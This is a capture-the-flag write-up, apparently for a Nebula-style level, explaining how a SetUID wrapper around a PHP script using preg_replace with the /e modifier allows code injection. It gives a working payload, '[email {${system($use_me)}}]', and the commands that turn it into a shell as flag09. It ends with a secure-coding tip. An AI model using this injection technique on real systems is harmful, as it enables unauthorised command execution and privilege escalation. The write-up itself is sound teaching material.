
---
### ðŸ§¾ Challenge Description

> This level presents a **SetUID binary wrapping a vulnerable PHP script** that processes custom markup.  
> The goal is to exploit a flaw in how user input is evaluated inside a regex replacement and gain code execution as `flag09`.

**Login:** `level09 : level09`  
**Target directory:** `/home/flag09`  
**Executable:** `./flag09`

---

### ðŸ’» Source Code Review

```php
$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
```

ðŸ” The problem lies in the use of the **`/e` modifier** in `preg_replace()`, which was deprecated in PHP 5.5 and removed in PHP 7.0.

ðŸ›‘ The `/e` flag means:

> Evaluate the second argument (`spam(\"\\2\")`) as **PHP code** after replacing.

That makes this **arbitrary code execution** if user input is crafted cleverly.

---

### ðŸŽ¯ Goal

Inject a payload into the input file that causes PHP code to execute as the `flag09` user when the script runs.

---

### ðŸ§¨ Exploitation Steps

#### ðŸª¤ Step 1: Craft the payload

We can break out of the `spam()` call using `${...}` and call arbitrary PHP functions like `system()`.

ðŸ’¥ Payload:

```
[email {${system($use_me)}}]
```

Why it works:

- `\\2` in the regex becomes `{${system($use_me)}}`
    
- PHP ends up evaluating: `spam("{${system($use_me)}}")`
    
- Which runs: `system($use_me)`
    

---

#### ðŸ—‚ï¸ Step 2: Prepare the test file

```bash
echo '[email {${system($use_me)}}]' > /tmp/test
```

#### ðŸš€ Step 3: Run the vulnerable wrapper

Pass the **file** and the **command to run** (`sh` in this case):

```bash
cd /home/flag09
./flag09 /tmp/test sh
```

You're now in a shell as `flag09`.

---

### ðŸ Step 4: Get the Flag

```bash
getflag
```

âœ… Output:

```
You have successfully executed getflag on a target account
```

---

### ðŸ” Takeaway

This level is a textbook example of why **evaluating code dynamically based on user input** is dangerous.

ðŸ›‘ **The `/e` modifier is evil.**

ðŸ” **Security Tip:**

> Never use `preg_replace` with the `/e` flag. Use safer alternatives like `preg_replace_callback()` and strictly validate inputs before evaluation.

---
